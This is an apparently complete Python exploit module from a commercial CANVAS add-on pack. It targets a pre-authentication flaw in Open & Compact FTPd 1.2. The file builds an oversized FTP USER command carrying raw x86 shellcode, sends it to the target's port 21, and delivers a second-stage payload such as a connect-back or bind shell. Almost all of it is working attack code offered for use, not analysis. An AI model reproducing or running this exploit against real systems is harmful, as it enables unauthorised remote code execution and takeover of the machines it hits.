
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

######################################################################################
NAME = "Open & Compact FTPd 1.2 Pre-Authentication Remote Exploit"
DESCRIPTION = "Exploits an array indexing issue when tokenising the USER field of the FTP service listening on port 21"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2010-02-07"
DOCUMENTATION["References"] = "http://sourceforge.net/projects/open-ftpd/"
DOCUMENTATION["Notes"] = "This vulnerability results in a direct return to the payload buffer, therefore it is not possible to disable DEP on enabled systems."

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","2003", "XP", "Vista", "7" ]

NOTES=""""""
PORT = 21
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["All versions", (0x00000000), []],
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
            "IE Inject Connect Back",
            "HTTPMOSDEF SSL",
            "HTTPMOSDEF PLAIN",
            "Bind MOSDEF Shell",
            "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20\x25\x26\x2b"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return    
        
    def test(self):
        # Simple test
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.log('WP> Checking ftp banner')
        ret = wp_bannerchecktest(self,self.host,self.port,{"Gabriel's FTP Server": 1})
              
        return ret

    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def makesploit(self):
        
        payload ="USER "
        payload += (wp_randomstring(2)+" ") * 199    # initial tokenisation string
        payload += "\x90" * 4                        # token overwrite returns directly to shellcode. No DEP bypass here.
        # Load the socet and setup buffer space
        payload += "\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF\x83\xC0\x38"
        payload += "\x8B\xB4\x24\x50\xF7\xFF\xFF\x8B\x36"
        payload += "\x33\xFF\x66\xBF\x10\x10"
        # code to use apps function for recv and jump to payload
        payload += wp_AppRecv(self,0x0040A11C)
        payload += "\x90" * 10                        # Second shellcodez will end up here
        payload += "\r\n"
                    
        return payload        


    def run(self):
        self.getArgs()

        payload = self.makesploit()
        
        try:

            self.log("WP> Connecting to target: %s:%d"%(self.host,self.port))
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit Trigger")
            s.sendall(payload)
            
            #time.sleep(1)
            self.log("WP> Sending Exploit Payload")
            s.sendall(self.shellcode)
            
            time.sleep(2) # to allow the buffer to get recved

            s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(2)
        
        # Check if follow up is required for some shellcodes
        ret = self.wp_postExploitShellcode(s)
        if ret:
            return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
